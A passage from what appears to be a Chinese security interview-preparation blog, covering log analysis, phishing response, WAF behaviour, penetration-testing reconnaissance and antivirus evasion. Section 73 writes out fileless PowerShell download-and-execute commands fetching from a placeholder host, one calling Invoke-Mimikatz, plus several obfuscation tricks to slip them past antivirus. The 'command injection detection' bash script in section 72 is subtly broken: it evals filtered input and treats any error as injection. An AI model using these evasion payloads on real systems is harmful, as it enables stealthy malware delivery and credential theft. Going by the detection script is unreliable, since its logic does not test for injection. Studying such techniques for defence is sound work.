&quot;(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4]</span><br><span class="line">[0-9]|[01]?[0-9][0-9]?)&quot;|uniq -c</span><br><span class="line"></span><br><span class="line">爆破用户名字典是什么？</span><br><span class="line">grep &quot;Failed password&quot; /var/log/secure|perl -e &#x27;while($_=&lt;&gt;)&#123; /for(.*?) from/; print</span><br><span class="line">&quot;$1\n&quot;;&#125;&#x27;|uniq -c|sort -nr</span><br><span class="line"></span><br><span class="line">登录成功的IP有哪些：</span><br><span class="line">grep &quot;Accepted &quot; /var/log/secure | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr | more</span><br><span class="line"></span><br><span class="line">登录成功的日期、用户名、IP：</span><br><span class="line">grep &quot;Accepted &quot; /var/log/secure | awk &#x27;&#123;print $1,$2,$3,$9,$11&#125;&#x27;</span><br><span class="line"></span><br><span class="line">增加一个用户kali日志：</span><br><span class="line">#grep &quot;useradd&quot; /var/log/username</span><br><span class="line"></span><br><span class="line">删除用户kali日志：</span><br><span class="line"># grep &quot;userdel&quot; /var/log/username</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h1>63.windows日志分析工具</h1>
<p><strong>Event Log Explorer</strong>是一款非常好用的Windows日志分析工具。可用于查看，监视和分析跟事件记录，包括安全，系统，应用程序和其他微软Windows 的记录被记载的事件，其强大的过滤功能可以快速的过滤出有价值的信息。</p>
<h1>64.给你一个比较大的日志，应该如何分析</h1>
<p>删除一些重复的日志</p>
<p>通过文本搜索,或者 grep来完成</p>
<p>使用一些github上的工具</p>
<h1>65.流量检测设备和态势感知设备发生报警，对警告进行分析，讲一下你流量分析和上机排查的思路</h1>
<h3 id="排查一下是否是误报-设备误报如何处理">排查一下是否是误报,设备误报如何处理</h3>
<p>先判断是否是恶意攻击行为</p>
<p>如果判断不了或者判断是真正的攻击行为立即上报</p>
<p>更新设备,与供应商联系进行修复,或者更新</p>
<h3 id="排查主机上面是否有其他的告警情况">排查主机上面是否有其他的告警情况</h3>
<p>如果存在首先隔绝该主机与其他主机的联系(内网下线处理，避免病毒横向传播导致局域网内其它机器被动染毒),可能的话关闭主机服务</p>
<h3 id="上机排查">上机排查</h3>
<p>首先排查服务日志情况,查看通过什么方式修补漏洞</p>
<p>其次查看主机操作日志 是否有其他横向渗透,或者权限维持手段</p>
<h2 id="ip代理如何排查">ip代理如何排查</h2>
<p>具体来说 看 X-Forwarded-For 请求头</p>
<p><strong>面试官问的时候是这样问的:</strong><br>
如果对方一分钟换一个IP怎么办</p>
<p>红队的ip不可能是无限的 可以寻找 一段时间内的规律进行统一封禁</p>
<p>或者根据攻击方的流量特征来进行封禁</p>
<h1>66.如何修改WEB端口？</h1>
<p>要修改Web端口，需要打开Web服务器的配置文件，</p>
<blockquote>
<p>Web服务器的配置文件可以在/etc/httpd/conf/httpd.conf或/etc/nginx/nginx.conf等位置找到。需要使用超级用户权限（sudo）打开配置文件。</p>
</blockquote>
<p>注释掉默认端口，添加新的端口，</p>
<blockquote>
<p>在配置文件中搜索默认Web端口。找到该行并将其用<code>#</code>注释掉。</p>
<p>在配置文件中添加新的端口。选择任何未被其他进程使用的端口。</p>
</blockquote>
<p>保存并关闭文件，并重启Web服务器。</p>
<blockquote>
<p>保存您所做的更改并关闭配置文件。</p>
<p><strong>systemctl restart apache2</strong></p>
</blockquote>
<h1>67.你还用过其他态势感知的产品吗？</h1>
<p>态势感知是基于网络环境、动态的、整体的洞悉网络安全风险，以安全大数据为基础，以企业的业务为核心，进行实时的异常检测，实现安全分析智能化与威胁可视化，并提供威胁情报共享、安全态势感知和高级威胁侦测分析等服务。</p>
<p>FOFA</p>
<p>之前面试奇安信的时候,了解过奇安信的天眼</p>
<p>阿里云安全中心</p>
<h1>68.钓鱼邮件处置</h1>
<p>屏蔽办公区域对钓鱼邮件内容涉及站点、URL访问</p>
<ul>
<li>屏蔽钓鱼邮件</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">屏蔽钓鱼邮件来源邮箱域名</span><br><span class="line">屏蔽钓鱼邮件来源IP</span><br><span class="line">有条件的可以根据邮件内容进行屏蔽</span><br><span class="line">删除还在邮件服务器未被客户端收取钓鱼邮件</span><br></pre></td></tr></table></figure>
<ul>
<li>处理接收到钓鱼邮件的用户</li>
</ul>
<p>根据钓鱼邮件发件人进行日志回溯</p>
<ul>
<li>
<p>全盘排查木马</p>
</li>
<li>
<p>加强人员安全认识</p>
</li>
</ul>
<h1>69.如何查看区分是扫描流量和手动流量</h1>
<p>可以通过观察流量的频率、操作行为、来源和目标范围等方面，来区分扫描流量和手动流量。</p>
<ul>
<li>**流量频率：**扫描流量通常会在短时间内不断尝试连接目标主机，而手动流量则不会频繁连接，会有较长的时间间隔。</li>
<li>**操作行为：**扫描流量的操作行为通常是重复的，例如不断尝试使用常见的弱口令或访问常见的漏洞路径；而手动流量则通常是有目的性的，例如尝试获取特定的敏感信息或利用已知的漏洞。</li>
<li>**流量来源：**扫描流量通常来自于自动化的工具或蠕虫病毒等恶意软件，而手动流量则来自于具有实际攻击能力的攻击者。</li>
<li>**目标范围：**扫描流量通常会涉及大量的目标主机，而手动流量则通常会针对特定的目标主机进行攻击。</li>
</ul>
<h1>70.WAF产品如何来拦截攻击？</h1>
<p>之前遇到过一个网站你想要用BP抓包的时候会直接锁定你现在的IP,再也不能访问这个页面,后面搜了一下,</p>
<p>多了一个Connection: close头部，删除这个头部burp发包发现能收到返回包。</p>
<p>burpsuite的机制是断点处理数据，这个站他会定时的抽检数据包，然后客户端定时返回，然后如果服务端没有接收到的话，他就认为这个东西丢包了。所以我们看不到回显页面的数据包。</p>
<ul>
<li>
<h3 id="WAF主要是通过内置的很多安全规则来进行防御">WAF主要是通过内置的很多安全规则来进行防御.</h3>
</li>
</ul>
<p>**签名检测：**可以通过对HTTP请求中的数据进行比对，来检测是否包含已知的攻击特征。</p>
<p>**白名单/黑名单：**WAF可以设置白名单和黑名单，对请求进行过滤。</p>
<p>**行为分析：**WAF还可以通过对HTTP请求的行为进行分析，例如请求的频率、请求参数的长度、请求内容的格式等，来判断是否为恶意请求。</p>
<p>**客户端行为检测：**WAF可以检测客户端的行为，例如检测是否包含恶意的JavaScript代码或者检测是否存在钓鱼攻击。</p>
<p>**报告和记录：**WAF可以记录所有的HTTP请求和响应，并且生成相应的报告和日志，可以帮助管理员及时发现并处理网络攻击。</p>
<p>可防护常见的SQL注入,XSS,网页篡改,中间件漏洞等OWASP TOP10攻击行<br>
具有威胁感知能力,当发现攻击后,可将IP进行锁定,IP锁定之后将无法访问网站业务<br>
也支持防止CC攻击,采用集中度和速率双重检测算法</p>
<p>不具备的功能**(给你加深一下 影响，防止你想不起来就乱猜)**</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">- WAF不能过滤其他协议流量，如FTP、PoP3协议</span><br><span class="line">- WAF不能实现传统防护墙功能，如地址映射</span><br><span class="line">- WAF不能防止网络层的DDoS攻击</span><br><span class="line">- WAF不能防病毒</span><br></pre></td></tr></table></figure>
<h1>71.不安全的第三方组件的漏洞如何做前置规避？</h1>
<p>这个不安全是指刚爆出一个严重的漏洞,那就更新呗,要是没修复,那就自己黑名单白名单过滤一下</p>
<p>都摆明了不安全了为什么还要用,只能提前为入侵、关闭或中断做好准备，事件响应计划很重要。通过实践、测试和易执行的响应计划和补救措施，防止损失,但要是重要服务的话未免太草率了</p>
<ul>
<li>
<p>安全战略评估</p>
<p>要评估风险与合规性，需要针对业务挑战、需求和目标评估现有的安全治理框架——包括数据隐私、第三方风险和IT法规合规需求及差距。安全风险量化、安全开发、法规和标准合规性以及安全教育和培训是关键</p>
</li>
<li>
<p>事件响应计划与编排</p>
<p>提前为入侵、关闭或中断做好准备，并拥有稳健的事件响应计划很重要。通过实践、测试和易执行的响应计划和补救措施，防止损失</p>
</li>
</ul>
<h1>72.如果现在要你写一个检测命令注入的脚本？</h1>
<p>我通常是用gpt,毕竟无论什么脚本人都是要先思考用哪个函数,而gpt可以直接生成更有效率</p>
<ol>
<li>获取用户输入参数：通过命令行参数或者交互式输入等方式获取用户输入的命令参数。</li>
<li>过滤用户输入：对用户输入进行过滤，去除可能的特殊字符和关键词，避免输入的命令包含危险的命令或者字符。</li>
<li>拼接命令串：使用过滤后的用户输入和合法的命令组成一个新的命令串。</li>
<li>检测命令注入：通过执行新的命令串，观察命令是否被正确执行，或者是否出现异常情况（例如命令执行时间过长、命令返回结果异常等），来判断是否存在命令注入漏洞。</li>
<li>输出检测结果：将检测结果输出到屏幕上或者写入日志文件中，提示用户检测结果和存在的漏洞。</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># 获取用户输入参数</span></span><br><span class="line"><span class="built_in">command</span>=<span class="variable">$1</span></span><br><span class="line"><span class="comment"># 过滤用户输入</span></span><br><span class="line"><span class="built_in">command</span>=$(<span class="built_in">echo</span> <span class="variable">$command</span> | sed <span class="string">&#x27;s/[^a-zA-Z0-9_]/ /g&#x27;</span>)</span><br><span class="line"><span class="comment"># 拼接命令串</span></span><br><span class="line">full_command=<span class="string">&quot;ls <span class="variable">$command</span>&quot;</span></span><br><span class="line"><span class="comment"># 检测命令注入</span></span><br><span class="line">output=$(<span class="built_in">eval</span> <span class="string">&quot;<span class="variable">$full_command</span>&quot;</span> 2&gt;&amp;1)</span><br><span class="line"><span class="keyword">if</span> [ $? -ne 0 ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Command injection vulnerability detected!&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Output: <span class="variable">$output</span>&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;No command injection vulnerability detected.&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
<h2 id="72-渗透测试流程">72.渗透测试流程</h2>
<p><strong>明确目标：<strong>主要是确定需要</strong>渗透资产范围</strong>；确定规则，如怎么去渗透；确定需求，如客户需要达到一个什么样的效果。</p>
<p><strong>信息收集：<strong>信息收集阶段主要是收集一些基础信息，<strong>系统信息</strong>，<strong>应用信息</strong>，<strong>版本信息</strong>，<strong>服务信息</strong>，<strong>人员信息</strong>以及</strong>相关防护信息</strong>。信息收集大多是工具加手工进行收集信息，工具如 nmap，相关终端命令，浏览器插件，在线工具等。(有能力就手搓一个也行,没能力就直接在github上找,毕竟造轮子比开发一个工具要省事)</p>
<p><strong>漏洞探测（挖掘）：<strong>主要是</strong>探测（挖掘）系统漏洞</strong>，<strong>web 服务器漏洞</strong>，<strong>web 应用漏洞</strong>以及<strong>其他端口服务漏洞</strong>，如 telnet，ssh，vnc，远程桌面连接服务（3389）等。</p>
<p>漏洞验证（利用）：漏洞验证主要是利用探测到的漏洞进行攻击，方法主要有自动化验证（msf），手工验证，业务漏洞验证，公开资源的验证等。总的来说就是工具加手工，为了方便，可以将自己渗透常使用的工具进行封装为工具包。</p>
<p>**提升权限：**提升权限主要是在当前用户权限不是管理员的时候需要进行提升权限，提升权限可以是提升系统权限，web 应用权限或是数据库权限等。</p>
<p>**清除痕迹：**清楚痕迹主要是清除渗透过程中操作的一些痕迹，如添加的测试账号，上传的测试文件,  powershell命令的历史记录等。</p>
<p><strong>事后信息分析</strong>：主要是对整个渗透过程进行信息分析与整理，分析脆弱环节，技术防护情况以及管理方面的情况进行一个现状分析以及提出相关建议。</p>
<p><strong>编写渗透测试报告</strong>：根据渗透测试具体情况编写渗透测试报告，渗透测试报告必须简洁明了，说清楚渗透清单（范围），攻击路径，渗透成果，以及详细的漏洞详情（相关描述、漏洞危害等）及可行的修复建议，最后对整改渗透情况进行简单的总结和分析，说清楚目前资产的一个状况是什么样的，应该从哪些方面进行加强和提升。</p>
<h3 id="边缘资产如何探测">边缘资产如何探测</h3>
<p>从主域名出发,我们首先需要考虑的是子域名,<a target="_blank" rel="noopener" href="http://xn--xxx-4l3e.com">即xxx.com</a>,</p>
<h3 id="子域名收集">子域名收集</h3>
<h4 id="搜索引擎查询">搜索引擎查询</h4>
<p>谷歌黑暗搜索:</p>
<blockquote>
<p>- site:domain.com filetype:xls|doc|pdf</p>
<p>- site:domain.com inurl:admin|login|manage</p>
<p>- site:domain.com intitle:管理|后台|登录</p>
<p>- site:domain.com intext:登录|后台、管理|error|debug</p>
<p>inturl:</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">网络空间安全搜索引擎</span><br><span class="line">zoomeye(钟馗之眼)：https://www.zoomeye.org</span><br><span class="line">shodan：https://www.shodan.io</span><br><span class="line">Fofa：https://fofa.so</span><br><span class="line"> </span><br><span class="line">PS：可编写Python脚本批量查询、获取</span><br></pre></td></tr></table></figure>
<h4 id="在线查询接口">在线查询接口</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">http://tool.chinaz.com/subdomain/</span><br><span class="line">http://i.links.cn/subdomain/    </span><br><span class="line">http://subdomain.chaxun.la/</span><br><span class="line">http://searchdns.netcraft.com/</span><br><span class="line">https://www.virustotal.com/</span><br><span class="line">https://censys.io/</span><br><span class="line">https://x.threatbook.cn/ 微步在线</span><br></pre></td></tr></table></figure>
<h4 id="子域名暴力猜解">子域名暴力猜解</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">爆破工具：</span><br><span class="line">Layer子域名挖掘机</span><br><span class="line">wydomain：https://github.com/ring04h/wydomain    </span><br><span class="line">subDomainsBrute:https://github.com/lijiejie/</span><br><span class="line">Sublist3r:https://github.com/aboul3la/Sublist3r</span><br></pre></td></tr></table></figure>
<h4 id="DNS查询-枚举">DNS查询/枚举</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">DNS查询：</span><br><span class="line">host -t a domainName</span><br><span class="line">host -t mx domainName</span><br><span class="line"> </span><br><span class="line">优点：非常直观，通过查询DNS服务器的A记录、CNAME等，可以准确得到相关信息，较全。</span><br><span class="line">缺点：有很大的局限性，很多DNS是禁止查询的。</span><br><span class="line">参考：https://www.cnblogs.com/xuanhun/p/3489038.html</span><br><span class="line"> </span><br><span class="line">域传送漏洞</span><br><span class="line"> </span><br><span class="line">DNS暴力破解：fierce</span><br><span class="line">参考链接：http://blog.csdn.net/jeanphorn/article/details/44987549</span><br><span class="line"> </span><br><span class="line">Passive DNS</span><br><span class="line">参考链接：http://www.freebuf.com/articles/network/103815.html</span><br></pre></td></tr></table></figure>
<h4 id="HTTPS证书">HTTPS证书</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">证书颁发机构(CA)必须将他们发布的每个SSL/TLS证书发布到公共日志中。SSL/TLS证书通常包含域名、子域名和电子邮件地址。因此SSL/TLS证书成为了攻击者的切入点。</span><br><span class="line"> </span><br><span class="line">SSL证书搜索引擎：</span><br><span class="line">https://certdb.com/domain/github.com</span><br><span class="line">https://crt.sh/?Identity=%%.github.com</span><br><span class="line">https://censys.io/</span><br><span class="line"> </span><br><span class="line">基于 HTTPS 证书的子域名收集小程序 ：GetDomainsBySSL.py</span><br><span class="line">参考链接：http://www.freebuf.com/articles/network/140738.html</span><br></pre></td></tr></table></figure>
<h4 id="综合搜索">综合搜索</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">提莫：https://github.com/bit4woo/teemo </span><br><span class="line">主要有三大模块：搜索引擎 第三方站点 枚举 </span><br><span class="line"> </span><br><span class="line">利用全网IP扫描http端口 在访问IP的80或者8080端口的时候，可能会遇到配置了301跳转的，可以在header里获取域名信息。</span><br><span class="line">全网扫描结果如下：https://scans.io/study/sonar.http</span><br></pre></td></tr></table></figure>
<h4 id="子域名筛选">子域名筛选</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">当收集的子域名数量过大，手动筛选工作量太大，如何快速扫描，半自动的筛选出有效的可能存在漏洞的子域名。</span><br><span class="line">参考链接：http://www.52bug.cn/%E9%BB%91%E5%AE%A2%E6%8A%80%E6%9C%AF/3413.html</span><br></pre></td></tr></table></figure>
<h4 id="相关域名收集">相关域名收集</h4>
<h5 id="旁站及c段收集">旁站及c段收集</h5>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">同IP网站及C段查询</span><br><span class="line">IP反查域名</span><br><span class="line"> </span><br><span class="line">工具：御剑、K8现在还是dirmap好用</span><br><span class="line">在线查询工具：</span><br><span class="line">http://www.hackmall.cn/</span><br><span class="line">http://www.webscan.cc/  推荐</span><br><span class="line">https://phpinfo.me/bing.php </span><br><span class="line"> </span><br><span class="line">将C段收集的相关IP，推测该单位所在的IP段，再针对IP段进行服务器端口扫描</span><br></pre></td></tr></table></figure>
<h5 id="端口扫描">端口扫描</h5>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">对1-65535端口扫描，探测Web服务端口</span><br></pre></td></tr></table></figure>
<h5 id="主站提取">主站提取</h5>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">通过编写爬虫,从主站页面(一般在主页)获取相关业务系统</span><br><span class="line"></span><br><span class="line">跨域策略文件 crossdomain.xml</span><br><span class="line">如：https://www.baidu.com/crossdomain.xml</span><br></pre></td></tr></table></figure>
<h5 id="移动端">移动端</h5>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">随着移动端的兴起，很多单位都有自己的移动APP、微信公众号、支付宝生活号等，这也是值得重点关注的点。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h5 id="行业系统">行业系统</h5>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">同行业可能存在类似的系统，甚至于采用同一家厂商的系统，可互做对比</span><br><span class="line">通用：办公OA、邮件系统、VPN等</span><br><span class="line">医院：门户、预约系统、掌上医院、微信公众平台等</span><br></pre></td></tr></table></figure>
<h2 id="73-免杀了解过多少">73.免杀了解过多少</h2>
<ul>
<li>
<p>有源码免杀</p>
</li>
<li>
<p>无源码免杀</p>
</li>
<li>
<p>powershell免杀</p>
</li>
</ul>
<h3 id="powershell免杀">powershell免杀</h3>
<p>powershell木马最常用的方式一般都为远程下载然后执行的方法,特点就是:直接内存运行,无文件落地.</p>
<p>例如:</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe <span class="literal">-nop</span> <span class="literal">-w</span> <span class="keyword">hidden</span> <span class="literal">-c</span> <span class="string">&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://x.x.x.x/a&#x27;))&quot;</span></span><br></pre></td></tr></table></figure>
<p>通常使用过程中当调用powershell进行远程下载执行时，会被杀软进行拦截。那么针对Powershell的免杀有两个思路：</p>
<p>对ps1文件进行免杀处理</p>
<p>对Powershell的行为进行免杀处理</p>
<h4 id="免杀方法">免杀方法</h4>
<h5 id="使用关键字拆分进行bypass">使用关键字拆分进行bypass</h5>
<p>例如，拆分前的powershell命令为：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe <span class="string">&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://x.x.x.x/a&#x27;))”</span></span><br></pre></td></tr></table></figure>
<p>假如杀软是对http这个关键字进行检测，那么我们可以对其进行如下拆分进行绕过，拆分后的powershell命令为</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="string">&quot;<span class="variable">$a</span>=&#x27;IEX((New-Object Net.WebClient).DownloadString(&#x27;&#x27;ht&#x27;;<span class="variable">$b</span>=&#x27;tp://x.x.x.x/a&#x27;&#x27;));Invoke-Mimikatz&#x27;;IEX (<span class="variable">$a</span>+<span class="variable">$b</span>)”</span></span><br></pre></td></tr></table></figure>
<p>假如是对downloadstring这个函数进行检测，那么我们可以使用replace来进行替换函数拆分downloadstring进行一个绕过，拆分后的powershell命令如下：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="string">&quot;<span class="variable">$a</span>=&#x27;IEX(New-Object Net.WebClient).Downlo&#x27;;<span class="variable">$b</span>=&#x27;123(&#x27;&#x27;http://x.x.x.x&#x27;&#x27;)&#x27;.Replace(&#x27;123&#x27;,&#x27;adString&#x27;);IEX (<span class="variable">$a</span>+<span class="variable">$b</span>)&quot;</span></span><br></pre></td></tr></table></figure>
<h5 id="Fuzz思想进行bypass">Fuzz思想进行bypass</h5>
<p>可以利用Fuzz的思想进行bypass</p>
<p>例如单引号混淆前的命令为:</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe <span class="string">&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://x.x.x.x/a’))”</span></span><br></pre></td></tr></table></figure>
<p>使用单引号混淆后的命令为：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe <span class="string">&quot;IEX ((new-object net.webclient).downloadstring(&#x27;ht‘+’tp://x.x.x.x/a’))”</span></span><br></pre></td></tr></table></figure>
<h5 id="超长命令bypass">超长命令bypass</h5>
<p>可以使用超长的命令来进行bypass。<br>
例如，利用超长命令bypas前的powershell命令为：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe <span class="string">&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://x.x.x.x/a’))”</span></span><br></pre></td></tr></table></figure>
<p>进行超长命令构造后的powershell命令为</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal w Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="built_in">IEX</span> ((<span class="built_in">new-object</span> net.webclient).downloadstring(<span class="string">&#x27;http://x.x.x.x/a&#x27;</span>))</span><br></pre></td></tr></table></figure>
<h5 id="使用copy命令进行bypass">使用copy命令进行bypass</h5>
<p>这里讲一个骚操作，一些杀软是检测powershell这个使用的动作，那么我们可以使用windows的copy命令，将powshell进行拷贝命名为其他的，例如，使用copy命令将powershell拷贝一个并命名为bypass.txt<br>
命令：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">copy</span> C:\Windows\System32\WindowsPowerShell\v1.<span class="number">0</span>\powershell.exe bypass.txt</span><br></pre></td></tr></table></figure>
<p>那么后面就可以这样子来执行powershell来进行绕过杀软检测：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bypass.txt <span class="built_in">IEX</span> ((<span class="built_in">new-object</span> net.webclient).downloadstring(<span class="string">&#x27;http://x.x.x.x/a&#x27;</span>))</span><br></pre></td></tr></table></figure>
<h5 id="混合bypass">混合bypass</h5>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="built_in">set-alias</span> <span class="literal">-name</span> key <span class="literal">-value</span> <span class="built_in">IEX</span>; key(<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;ht‘+’tp://x.x.x.x/a&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>跟不知道有没有逆着读命令进行绕过的方法</p>
<h2 id="74-不死马查杀">74.不死马查杀</h2>
<p>看一个简单的不死马例子</p>
